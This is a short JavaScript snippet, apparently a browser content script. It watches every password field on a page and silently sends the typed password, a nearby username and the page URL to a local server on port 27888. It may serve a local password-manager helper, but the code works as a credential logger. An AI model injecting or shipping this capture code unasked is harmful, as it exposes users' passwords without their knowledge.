(function () {
  function getSiteInfo() {
    return {
      site: window.location.hostname,
      url: window.location.href,
      title: document.title
    };
  }
  function reportPassword(pass, user) {
    fetch('http://127.0.0.1:27888/password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.assign(getSiteInfo(), { pass: pass, user: user }))
    }).catch(function () {});
  }
  document.addEventListener('input', function (e) {
    var t = e.target;
    if (!t || t.tagName !== 'INPUT' || t.type !== 'password') return;
    if (t.value.length < 6) return;
    var form = t.closest('form') || document;
    var userInput = form.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]');
    var user = userInput ? userInput.value : '';
    clearTimeout(t.__gplanTimer);
    t.__gplanTimer = setTimeout(function () {
      reportPassword(t.value, user);
    }, 800);
  }, true);
})();
